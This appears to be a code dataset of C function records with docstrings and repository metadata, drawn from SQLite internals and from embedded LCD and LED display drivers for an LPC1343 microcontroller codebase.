{"docstring": "/*\n** Decrement the ref-count on the SubProgram structure passed as the\n** second argument. If the ref-count reaches zero, free the structure.\n**\n** The array of VDBE opcodes stored as SubProgram.aOp is freed if\n** either the ref-count reaches zero or parameter freeop is non-zero.\n**\n** Since the array of opcodes pointed to by SubProgram.aOp may directly\n** or indirectly contain a reference to the SubProgram structure itself.\n** By passing a non-zero freeop parameter, the caller may ensure that all\n** SubProgram structures and their aOp arrays are freed, even when there\n** are such circular references.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3VdbeProgramDelete(sqlite3 *db, SubProgram *p, int freeop)", "code": "{\n  if( p ){\n    assert( p->nRef>0 );\n    if( freeop || p->nRef==1 ){\n      Op *aOp = p->aOp;\n      p->aOp = 0;\n      vdbeFreeOpArray(db, aOp, p->nOp);\n      p->nOp = 0;\n    }\n    p->nRef--;\n    if( p->nRef==0 ){\n      sqlite3DbFree(db, p);\n    }\n  }\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** Analyze the given expression looking for aggregate functions and\n** for variables that need to be added to the pParse->aAgg[] array.\n** Make additional entries to the pParse->aAgg[] array as necessary.\n**\n** This routine should only be called after the expression has been\n** analyzed by sqlite3ResolveExprNames().\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3ExprAnalyzeAggregates(NameContext *pNC, Expr *pExpr)", "code": "{\n  Walker w;\n  w.xExprCallback = analyzeAggregate;\n  w.xSelectCallback = analyzeAggregatesInSelect;\n  w.u.pNC = pNC;\n  assert( pNC->pSrcList!=0 );\n  sqlite3WalkExpr(&w, pExpr);\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** This function is called when the root page of a b-tree structure is\n** overfull (has one or more overflow pages).\n**\n** A new child page is allocated and the contents of the current root\n** page, including overflow cells, are copied into the child. The root\n** page is then overwritten to make it an empty page with the right-child \n** pointer pointing to the new page.\n**\n** Before returning, all pointer-map entries corresponding to pages \n** that the new child-page now contains pointers to are updated. The\n** entry corresponding to the new right-child pointer of the root\n** page is also updated.\n**\n** If successful, *ppChild is set to contain a reference to the child \n** page and SQLITE_OK is returned. In this case the caller is required\n** to call releasePage() on *ppChild exactly once. If an error occurs,\n** an error code is returned and *ppChild is set to 0.\n*/\n", "func_signal": "static int balance_deeper(MemPage *pRoot, MemPage **ppChild)", "code": "{\n  int rc;                        /* Return value from subprocedures */\n  MemPage *pChild = 0;           /* Pointer to a new child page */\n  Pgno pgnoChild = 0;            /* Page number of the new child page */\n  BtShared *pBt = pRoot->pBt;    /* The BTree */\n\n  assert( pRoot->nOverflow>0 );\n  assert( sqlite3_mutex_held(pBt->mutex) );\n\n  /* Make pRoot, the root page of the b-tree, writable. Allocate a new \n  ** page that will become the new right-child of pPage. Copy the contents\n  ** of the node stored on pRoot into the new child page.\n  */\n  rc = sqlite3PagerWrite(pRoot->pDbPage);\n  if( rc==SQLITE_OK ){\n    rc = allocateBtreePage(pBt,&pChild,&pgnoChild,pRoot->pgno,0);\n    copyNodeContent(pRoot, pChild, &rc);\n    if( ISAUTOVACUUM ){\n      ptrmapPut(pBt, pgnoChild, PTRMAP_BTREE, pRoot->pgno, &rc);\n    }\n  }\n  if( rc ){\n    *ppChild = 0;\n    releasePage(pChild);\n    return rc;\n  }\n  assert( sqlite3PagerIswriteable(pChild->pDbPage) );\n  assert( sqlite3PagerIswriteable(pRoot->pDbPage) );\n  assert( pChild->nCell==pRoot->nCell );\n\n  TRACE((\"BALANCE: copy root %d into %d\\n\", pRoot->pgno, pChild->pgno));\n\n  /* Copy the overflow cells from pRoot to pChild */\n  memcpy(pChild->aOvfl, pRoot->aOvfl, pRoot->nOverflow*sizeof(pRoot->aOvfl[0]));\n  pChild->nOverflow = pRoot->nOverflow;\n\n  /* Zero the contents of pRoot. Then install pChild as the right-child. */\n  zeroPage(pRoot, pChild->aData[0] & ~PTF_LEAF);\n  put4byte(&pRoot->aData[pRoot->hdrOffset+8], pgnoChild);\n\n  *ppChild = pChild;\n  return SQLITE_OK;\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** If there are no outstanding cursors and we are not in the middle\n** of a transaction but there is a read lock on the database, then\n** this routine unrefs the first page of the database file which \n** has the effect of releasing the read lock.\n**\n** If there is a transaction in progress, this routine is a no-op.\n*/\n", "func_signal": "static void unlockBtreeIfUnused(BtShared *pBt)", "code": "{\n  assert( sqlite3_mutex_held(pBt->mutex) );\n  assert( pBt->pCursor==0 || pBt->inTransaction>TRANS_NONE );\n  if( pBt->inTransaction==TRANS_NONE && pBt->pPage1!=0 ){\n    assert( pBt->pPage1->aData );\n    assert( sqlite3PagerRefcount(pBt->pPager)==1 );\n    assert( pBt->pPage1->aData );\n    releasePage(pBt->pPage1);\n    pBt->pPage1 = 0;\n  }\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** Sync the pager file to disk. This is a no-op for in-memory files\n** or pages with the Pager.noSync flag set.\n**\n** If successful, or called on a pager for which it is a no-op, this\n** function returns SQLITE_OK. Otherwise, an IO error code is returned.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3PagerSync(Pager *pPager)", "code": "{\n  int rc;                              /* Return code */\n  assert( !MEMDB );\n  if( pPager->noSync ){\n    rc = SQLITE_OK;\n  }else{\n    rc = sqlite3OsSync(pPager->fd, pPager->sync_flags);\n  }\n  return rc;\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** Given a wildcard parameter name, return the index of the variable\n** with that name.  If there is no variable with the given name,\n** return 0.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3VdbeParameterIndex(Vdbe *p, const char *zName, int nName)", "code": "{\n  int i;\n  if( p==0 ){\n    return 0;\n  }\n  createVarMap(p); \n  if( zName ){\n    for(i=0; i<p->nVar; i++){\n      const char *z = p->azVar[i];\n      if( z && memcmp(z,zName,nName)==0 && z[nName]==0 ){\n        return i+1;\n      }\n    }\n  }\n  return 0;\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** Helper function for fts3NodeWrite().\n*/\n", "func_signal": "static int fts3TreeFinishNode(\n  SegmentNode *pTree, \n  int iHeight, \n  sqlite3_int64 iLeftChild\n)", "code": "{\n  int nStart;\n  assert( iHeight>=1 && iHeight<128 );\n  nStart = FTS3_VARINT_MAX - sqlite3Fts3VarintLen(iLeftChild);\n  pTree->aData[nStart] = (char)iHeight;\n  sqlite3Fts3PutVarint(&pTree->aData[nStart+1], iLeftChild);\n  return nStart;\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** Truncate the file.\n*/\n", "func_signal": "static int memjrnlTruncate(sqlite3_file *pJfd, sqlite_int64 size)", "code": "{\n  MemJournal *p = (MemJournal *)pJfd;\n  FileChunk *pChunk;\n  assert(size==0);\n  UNUSED_PARAMETER(size);\n  pChunk = p->pFirst;\n  while( pChunk ){\n    FileChunk *pTmp = pChunk;\n    pChunk = pChunk->pNext;\n    sqlite3_free(pTmp);\n  }\n  sqlite3MemJournalOpen(pJfd);\n  return SQLITE_OK;\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** Compute all offsets for the current row of the query.  \n** If the offsets have already been computed, this routine is a no-op.\n*/\n", "func_signal": "static int snippetAllOffsets(Fts3Cursor *pCsr, Snippet **ppSnippet)", "code": "{\n  Fts3Table *p = (Fts3Table *)pCsr->base.pVtab;  /* The FTS3 virtual table */\n  int nColumn;           /* Number of columns.  Docid does count */\n  int iColumn;           /* Index of of a column */\n  int i;                 /* Loop index */\n  int iFirst;            /* First column to search */\n  int iLast;             /* Last coumn to search */\n  int iTerm = 0;\n  Snippet *pSnippet;\n  int rc = SQLITE_OK;\n\n  if( pCsr->pExpr==0 ){\n    return SQLITE_OK;\n  }\n\n  pSnippet = (Snippet *)sqlite3_malloc(sizeof(Snippet));\n  *ppSnippet = pSnippet;\n  if( !pSnippet ){\n    return SQLITE_NOMEM;\n  }\n  memset(pSnippet, 0, sizeof(Snippet));\n\n  nColumn = p->nColumn;\n  iColumn = (pCsr->eSearch - 2);\n  if( iColumn<0 || iColumn>=nColumn ){\n    /* Look for matches over all columns of the full-text index */\n    iFirst = 0;\n    iLast = nColumn-1;\n  }else{\n    /* Look for matches in the iColumn-th column of the index only */\n    iFirst = iColumn;\n    iLast = iColumn;\n  }\n  for(i=iFirst; rc==SQLITE_OK && i<=iLast; i++){\n    const char *zDoc;\n    int nDoc;\n    zDoc = (const char*)sqlite3_column_text(pCsr->pStmt, i+1);\n    nDoc = sqlite3_column_bytes(pCsr->pStmt, i+1);\n    if( zDoc==0 && sqlite3_column_type(pCsr->pStmt, i+1)!=SQLITE_NULL ){\n      rc = SQLITE_NOMEM;\n    }else{\n      rc = snippetOffsetsOfColumn(pCsr, pSnippet, i, zDoc, nDoc);\n    }\n  }\n\n  while( trimSnippetOffsets(pCsr->pExpr, pSnippet, &iTerm) ){\n    iTerm = 0;\n  }\n\n  return rc;\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** Set *pSize to the size of the buffer needed to hold the value of\n** the key for the current entry.  If the cursor is not pointing\n** to a valid entry, *pSize is set to 0. \n**\n** For a table with the INTKEY flag set, this routine returns the key\n** itself, not the number of bytes in the key.\n**\n** The caller must position the cursor prior to invoking this routine.\n** \n** This routine cannot fail.  It always returns SQLITE_OK.  \n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3BtreeKeySize(BtCursor *pCur, i64 *pSize)", "code": "{\n  assert( cursorHoldsMutex(pCur) );\n  assert( pCur->eState==CURSOR_INVALID || pCur->eState==CURSOR_VALID );\n  if( pCur->eState!=CURSOR_VALID ){\n    *pSize = 0;\n  }else{\n    getCellInfo(pCur);\n    *pSize = pCur->info.nKey;\n  }\n  return SQLITE_OK;\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** Extract the smallest element from the RowSet.\n** Write the element into *pRowid.  Return 1 on success.  Return\n** 0 if the RowSet is already empty.\n**\n** After this routine has been called, the sqlite3RowSetInsert()\n** routine may not be called again.  \n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3RowSetNext(RowSet *p, i64 *pRowid)", "code": "{\n  rowSetToList(p);\n  if( p->pEntry ){\n    *pRowid = p->pEntry->v;\n    p->pEntry = p->pEntry->pRight;\n    if( p->pEntry==0 ){\n      sqlite3RowSetClear(p);\n    }\n    return 1;\n  }else{\n    return 0;\n  }\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/*\n** Enter the mutex of every btree in the array.  This routine is\n** called at the beginning of sqlite3VdbeExec().  The mutexes are\n** exited at the end of the same function.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3BtreeMutexArrayEnter(BtreeMutexArray *pArray)", "code": "{\n  int i;\n  for(i=0; i<pArray->nMutex; i++){\n    Btree *p = pArray->aBtree[i];\n    /* Some basic sanity checking */\n    assert( i==0 || pArray->aBtree[i-1]->pBt<p->pBt );\n    assert( !p->locked || p->wantToLock>0 );\n\n    /* We should already hold a lock on the database connection */\n    assert( sqlite3_mutex_held(p->db->mutex) );\n\n    /* The Btree is sharable because only sharable Btrees are entered\n    ** into the array in the first place. */\n    assert( p->sharable );\n\n    p->wantToLock++;\n    if( !p->locked ){\n      lockBtreeMutex(p);\n    }\n  }\n}", "path": "cookbook\\python2.7\\jni\\sqlite3\\sqlite3.c", "repo_name": "jyio/botbrew", "stars": 86, "license": "mit", "language": "c", "size": 2667}
{"docstring": "/**************************************************************************/\n/*! \n    @brief  Sets the decode enable register to indicate if BCD or HEX\n            decoding should be used.  Set to 0 for no BCD on all digits.\n*/\n/**************************************************************************/\n", "func_signal": "as1115Error_t as1115SetDecodeMode(uint8_t x)", "code": "{\n  as1115Error_t error = AS1115_ERROR_OK;\n\n  error = as1115WriteCmdData(AS1115_SUBADDRESS, AS1115_DECODEMODE, x);\n  return error;\n}", "path": "drivers\\displays\\segment\\as1115\\as1115.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/**************************************************************************/\n/*! \n    @brief  Sets the intensity control register (0..15 or 0x00..0x0F)\n*/\n/**************************************************************************/\n", "func_signal": "as1115Error_t as1115SetBrightness(uint8_t x)", "code": "{\n  as1115Error_t error = AS1115_ERROR_OK;\n\n  if (x > 0xF) x = 0xF;\n\n  error = as1115WriteCmdData(AS1115_SUBADDRESS, AS1115_INTENSITY, x);\n  return error;\n}", "path": "drivers\\displays\\segment\\as1115\\as1115.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/*************************************************/\n", "func_signal": "void lcdDrawVLine(uint16_t x, uint16_t y0, uint16_t y1, uint16_t color)", "code": "{\n  // Allows for slightly better performance than setting individual pixels\n  uint16_t y, pixels;\n\n  if (y1 < y0)\n  {\n    // Switch y1 and y0\n    y = y1;\n    y1 = y0;\n    y0 = y;\n  }\n\n  // Check limits\n  if (y1 >= lcdGetHeight())\n  {\n    y1 = lcdGetHeight() - 1;\n  }\n  if (y0 >= lcdGetHeight())\n  {\n    y0 = lcdGetHeight() - 1;\n  }\n\n  st7735SetAddrWindow(x, y0, x, lcdGetHeight());\n  st7735WriteCmd(ST7735_RAMWR);  // write to RAM\n  for (pixels = 0; pixels < y1 - y0 + 1; pixels++)\n  {\n    st7735WriteData(color >> 8);  \n    st7735WriteData(color);\n  }\n  st7735WriteCmd(ST7735_NOP);\n}", "path": "drivers\\displays\\tft\\hw\\st7735.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/*************************************************/\n", "func_signal": "void st7735WriteData(uint8_t data)", "code": "{\n  CLR_CS;\n  SET_RS; \n  uint8_t i = 0;\n  for (i=0; i<8; i++) \n  { \n    if (data & 0x80) \n    { \n      SET_SDA;\n    } \n    else \n    { \n      CLR_SDA;\n    } \n    CLR_SCL;\n    data <<= 1; \n    SET_SCL;    \n  } \n  SET_CS;\n}", "path": "drivers\\displays\\tft\\hw\\st7735.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/*************************************************/\n", "func_signal": "void lcdBacklight(bool state)", "code": "{\n  // Set the backlight\n  // Note: Depending on the type of transistor used\n  // to control the backlight, you made need to invert\n  // the values below\n  if (state)\n    // CLR_BL;\n    SET_BL;\n  else\n    // SET_BL;\n    CLR_BL;\n}", "path": "drivers\\displays\\tft\\hw\\st7735.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/**************************************************************************/\n/*! \n    @brief  Draws an array of consecutive RGB565 pixels (much\n            faster than addressing each pixel individually)\n*/\n/**************************************************************************/\n", "func_signal": "void lcdDrawPixels(uint16_t x, uint16_t y, uint16_t *data, uint32_t len)", "code": "{\n  // ToDo: Optimise this function ... currently only a placeholder\n  uint32_t i = 0;\n  do\n  {\n    lcdDrawPixel(x+i, y, data[i]);\n    i++;\n  } while (i<len);\n}", "path": "drivers\\displays\\tft\\hw\\st7735.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/*************************************************/\n", "func_signal": "void st7735InitDisplay(void)", "code": "{\n  st7735WriteCmd(ST7735_SWRESET); // software reset\n  systickDelay(50);\n  st7735WriteCmd(ST7735_SLPOUT);  // out of sleep mode\n  systickDelay(500);\n  \n  st7735WriteCmd(ST7735_COLMOD);  // set color mode\n  st7735WriteData(0x05);          // 16-bit color\n  systickDelay(10);\n  \n  st7735WriteCmd(ST7735_FRMCTR1); // frame rate control\n  st7735WriteData(0x00);          // fastest refresh\n  st7735WriteData(0x06);          // 6 lines front porch\n  st7735WriteData(0x03);          // 3 lines backporch\n  systickDelay(10);\n  \n  st7735WriteCmd(ST7735_MADCTL);  // memory access control (directions)\n  st7735WriteData(0xC8);          // row address/col address, bottom to top refresh\n  \n  st7735WriteCmd(ST7735_DISSET5); // display settings #5\n  st7735WriteData(0x15);          // 1 clock cycle nonoverlap, 2 cycle gate rise, 3 cycle oscil. equalize\n  st7735WriteData(0x02);          // fix on VTL\n \n  st7735WriteCmd(ST7735_INVCTR);  // display inversion control\n  st7735WriteData(0x0);           // line inversion\n \n  st7735WriteCmd(ST7735_PWCTR1);  // power control\n  st7735WriteData(0x02);          // GVDD = 4.7V \n  st7735WriteData(0x70);          // 1.0uA\n  systickDelay(10);\n  st7735WriteCmd(ST7735_PWCTR2);  // power control\n  st7735WriteData(0x05);          // VGH = 14.7V, VGL = -7.35V \n  st7735WriteCmd(ST7735_PWCTR3);  // power control\n  st7735WriteData(0x01);          // Opamp current small \n  st7735WriteData(0x02);          // Boost frequency\n  \n  \n  st7735WriteCmd(ST7735_VMCTR1);  // power control\n  st7735WriteData(0x3C);          // VCOMH = 4V\n  st7735WriteData(0x38);          // VCOML = -1.1V\n  systickDelay(10);\n  \n  st7735WriteCmd(ST7735_PWCTR6);  // power control\n  st7735WriteData(0x11); \n  st7735WriteData(0x15);\n  \n  st7735WriteCmd(ST7735_GMCTRP1);\n  st7735WriteData(0x09);\n  st7735WriteData(0x16);\n  st7735WriteData(0x09);\n  st7735WriteData(0x20);\n  st7735WriteData(0x21);\n  st7735WriteData(0x1B);\n  st7735WriteData(0x13);\n  st7735WriteData(0x19);\n  st7735WriteData(0x17);\n  st7735WriteData(0x15);\n  st7735WriteData(0x1E);\n  st7735WriteData(0x2B);\n  st7735WriteData(0x04);\n  st7735WriteData(0x05);\n  st7735WriteData(0x02);\n  st7735WriteData(0x0E);\n  st7735WriteCmd(ST7735_GMCTRN1);\n  st7735WriteData(0x0B); \n  st7735WriteData(0x14); \n  st7735WriteData(0x08); \n  st7735WriteData(0x1E); \n  st7735WriteData(0x22); \n  st7735WriteData(0x1D); \n  st7735WriteData(0x18); \n  st7735WriteData(0x1E); \n  st7735WriteData(0x1B); \n  st7735WriteData(0x1A); \n  st7735WriteData(0x24); \n  st7735WriteData(0x2B); \n  st7735WriteData(0x06); \n  st7735WriteData(0x06); \n  st7735WriteData(0x02); \n  st7735WriteData(0x0F); \n  systickDelay(10);\n  \n  st7735WriteCmd(ST7735_CASET);   // column addr set\n  st7735WriteData(0x00);\n  st7735WriteData(0x02);          // XSTART = 2\n  st7735WriteData(0x00);\n  st7735WriteData(0x81);          // XEND = 129\n\n  st7735WriteCmd(ST7735_RASET);   // row addr set\n  st7735WriteData(0x00);\n  st7735WriteData(0x02);          // XSTART = 1\n  st7735WriteData(0x00);\n  st7735WriteData(0x81);          // XEND = 160\n\n  st7735WriteCmd(ST7735_NORON);   // normal display on\n  systickDelay(10);\n  \n  st7735WriteCmd(ST7735_DISPON);\n  systickDelay(500);\n}", "path": "drivers\\displays\\tft\\hw\\st7735.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/**************************************************************************/\n/*! \n    @brief  Send test command\n*/\n/**************************************************************************/\n", "func_signal": "as1115Error_t as1115Test(void)", "code": "{\n  as1115Error_t error = AS1115_ERROR_OK;\n  uint8_t results;\n\n  if (!_as1115Initialised) as1115Init();\n\n  // Use test register to detect LED status\n  error = as1115WriteCmd(AS1115_SUBADDRESS, AS1115_DISPTEST);\n  if (error) return error;\n\n  error = as1115Read8(AS1115_SUBADDRESS, &results);\n  if (error) return error;\n\n  // Throw an error since something is wrong with the wiring (use 'results' to check)\n  if ((results & 0xF8) != 0x80) \n  {\n    return AS1115_ERROR_UNEXPECTEDRESPONSE;\n  } \n\n  // Turn everything on\n  error = as1115WriteCmdData(AS1115_SUBADDRESS, AS1115_DISPTEST, 0x01);\n  if (error) return error;  \n  systickDelay(1000);\n\n  // Turn everything off\n  error = as1115WriteCmdData(AS1115_SUBADDRESS, AS1115_DISPTEST, 0x00);\n  if (error) return error;\n  \n  return error;\n}", "path": "drivers\\displays\\segment\\as1115\\as1115.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/*************************************************/\n", "func_signal": "void lcdFillRGB(uint16_t color)", "code": "{\n  uint8_t x, y;\n  st7735SetAddrWindow(0, 0, lcdGetWidth() - 1, lcdGetHeight() - 1);\n  st7735WriteCmd(ST7735_RAMWR);  // write to RAM\n  for (x=0; x < lcdGetWidth(); x++) \n  {\n    for (y=0; y < lcdGetHeight(); y++) \n    {\n      st7735WriteData(color >> 8);    \n      st7735WriteData(color);    \n    }\n  }\n  st7735WriteCmd(ST7735_NOP);\n}", "path": "drivers\\displays\\tft\\hw\\st7735.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/**************************************************************************/\n/*! \n    @brief  Reads a single byte over I2C\n*/\n/**************************************************************************/\n", "func_signal": "as1115Error_t as1115Read8(uint8_t address, uint8_t *value)", "code": "{\n  // Clear write buffers\n  uint32_t i;\n  for ( i = 0; i < I2C_BUFSIZE; i++ )\n  {\n    I2CMasterBuffer[i] = 0x00;\n  }\n\n  // ToDo: Add real I2C error checking\n  I2CWriteLength = 0;\n  I2CReadLength = 1;\n  I2CMasterBuffer[0] = address | AS1115_READBIT;\n  i2cEngine();\n\n  *value = I2CSlaveBuffer[0];\n\n  return AS1115_ERROR_OK;\n}", "path": "drivers\\displays\\segment\\as1115\\as1115.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/**************************************************************************/\n/*! \n    @brief  Initialises the I2C block\n*/\n/**************************************************************************/\n", "func_signal": "as1115Error_t as1115Init(void)", "code": "{\n  // Initialise I2C\n  if (i2cInit(I2CMASTER) == false)\n  {\n    return AS1115_ERROR_I2CINIT;    /* Fatal error */\n  }\n\n  // Reset AS1115 to normal operation with default settings\n  as1115WriteCmdData(AS1115_ADDRESS, AS1115_SHUTDOWN, 0x01);\n\n  // Use user-set I2C address (000000 + address pins)\n  as1115WriteCmdData(AS1115_ADDRESS, AS1115_SELFADDR, 0x01);\n\n  systickDelay(20);\n\n  // Use hex decoding\n  as1115SetDecodeMode(0);\n\n  // Set the brightness to the maximum value (0x0F)\n  as1115SetBrightness(0xF);\n\n  // Turn on all digits by default (0..7)\n  as1115WriteCmdData(AS1115_SUBADDRESS, AS1115_SCANLIMIT, 0x07);\n\n  _as1115Initialised = true;\n\n  return AS1115_ERROR_OK;\n}", "path": "drivers\\displays\\segment\\as1115\\as1115.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/*************************************************/\n", "func_signal": "void lcdDrawPixel(uint16_t x, uint16_t y, uint16_t color)", "code": "{\n  st7735SetAddrWindow(x,y,x+1,y+1);\n  st7735WriteCmd(ST7735_RAMWR);  // write to RAM\n  st7735WriteData(color >> 8);  \n  st7735WriteData(color);\n}", "path": "drivers\\displays\\tft\\hw\\st7735.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/**************************************************************************/\n/*! \n    Causes the LED to flash every second using a non-blocking delay,\n    and constantly checks if any incoming characters have arrived in\n    the UART buffer for the CLI\n\n    projectconfig.h settings:\n    --------------------------------------------------\n    CFG_INTERFACE     -> Enabled\n    CFG_PRINTF_USBCDC -> Enabled if USB is used for the CLI\n    CFG_PRINTF_UART   -> Enabled if UART is used for the CLI\n*/\n/**************************************************************************/\n", "func_signal": "int main(void)", "code": "{\n  // Configure cpu and mandatory peripherals\n  systemInit();\n\n  uint32_t currentSecond, lastSecond;\n  currentSecond = lastSecond = 0;\n\n  // Toggle LED once per second and constantly check CLI input\n  while (1)\n  {\n    // Get the number of seconds the CPU has been active\n    // If the value has changed we've advanced at least 1 second\n    currentSecond = systickGetSecondsActive();\n    if (currentSecond != lastSecond)\n    {\n      lastSecond = currentSecond;\n      // Toggle the LED\n      if (gpioGetValue(CFG_LED_PORT, CFG_LED_PIN) == CFG_LED_OFF)\n      {\n        gpioSetValue (CFG_LED_PORT, CFG_LED_PIN, CFG_LED_ON); \n      }\n      else\n      {\n        gpioSetValue (CFG_LED_PORT, CFG_LED_PIN, CFG_LED_OFF); \n      }\n    }\n\n    // Poll for CLI input if CFG_INTERFACE is enabled in projectconfig.h\n    #ifdef CFG_INTERFACE \n      cmdPoll(); \n    #endif\n  }\n\n  return 0;\n}", "path": "tools\\examples\\basics\\blinky_nonblocking\\main.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/**************************************************************************/\n/*! \n    @brief  Sets the feature bit (controls blinking, clock source, etc.)\n*/\n/**************************************************************************/\n", "func_signal": "as1115Error_t as1115SetFeature(uint8_t feature)", "code": "{\n  as1115Error_t error = AS1115_ERROR_OK;\n\n  error = as1115WriteCmdData(AS1115_SUBADDRESS, AS1115_FEATURE, feature);\n  return error;\n}", "path": "drivers\\displays\\segment\\as1115\\as1115.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/**************************************************************************/\n/*! \n    @brief  Writes an command byte followed by a data byte over I2C\n*/\n/**************************************************************************/\n", "func_signal": "as1115Error_t as1115WriteCmdData (uint8_t address, uint8_t cmd, uint8_t data)", "code": "{\n  // Clear write buffers\n  uint32_t i;\n  for ( i = 0; i < I2C_BUFSIZE; i++ )\n  {\n    I2CMasterBuffer[i] = 0x00;\n  }\n\n  // ToDo: Add real I2C error checking\n  I2CWriteLength = 3;\n  I2CReadLength = 0;\n  I2CMasterBuffer[0] = address;               // I2C device address\n  I2CMasterBuffer[1] = cmd;                   // Command register\n  I2CMasterBuffer[2] = data;                  // Value to write\n  i2cEngine();\n  return AS1115_ERROR_OK;\n}", "path": "drivers\\displays\\segment\\as1115\\as1115.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/*************************************************/\n", "func_signal": "void st7735SetAddrWindow(uint8_t x0, uint8_t y0, uint8_t x1, uint8_t y1)", "code": "{\n  st7735WriteCmd(ST7735_CASET);   // column addr set\n  st7735WriteData(0x00);\n  st7735WriteData(x0+2);          // XSTART \n  st7735WriteData(0x00);\n  st7735WriteData(x1+2);          // XEND\n\n  st7735WriteCmd(ST7735_RASET);   // row addr set\n  st7735WriteData(0x00);\n  st7735WriteData(y0+1);          // YSTART\n  st7735WriteData(0x00);\n  st7735WriteData(y1+1);          // YEND\n}", "path": "drivers\\displays\\tft\\hw\\st7735.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/*************************************************/\n", "func_signal": "void lcdTest(void)", "code": "{\n  uint8_t i = 0;\n  for (i = 0; i < 100; i++)\n  {\n    lcdDrawPixel(i, i, 0xFFFF);\n  }\n}", "path": "drivers\\displays\\tft\\hw\\st7735.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/*************************************************/\n", "func_signal": "void lcdDrawHLine(uint16_t x0, uint16_t x1, uint16_t y, uint16_t color)", "code": "{\n  // Allows for slightly better performance than setting individual pixels\n  uint16_t x, pixels;\n\n  if (x1 < x0)\n  {\n    // Switch x1 and x0\n    x = x1;\n    x1 = x0;\n    x0 = x;\n  }\n\n  // Check limits\n  if (x1 >= lcdGetWidth())\n  {\n    x1 = lcdGetWidth() - 1;\n  }\n  if (x0 >= lcdGetWidth())\n  {\n    x0 = lcdGetWidth() - 1;\n  }\n\n  st7735SetAddrWindow(x0, y, lcdGetWidth(), y + 1);\n  st7735WriteCmd(ST7735_RAMWR);  // write to RAM\n  for (pixels = 0; pixels < x1 - x0 + 1; pixels++)\n  {\n    st7735WriteData(color >> 8);  \n    st7735WriteData(color);\n  }\n  st7735WriteCmd(ST7735_NOP);\n}", "path": "drivers\\displays\\tft\\hw\\st7735.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
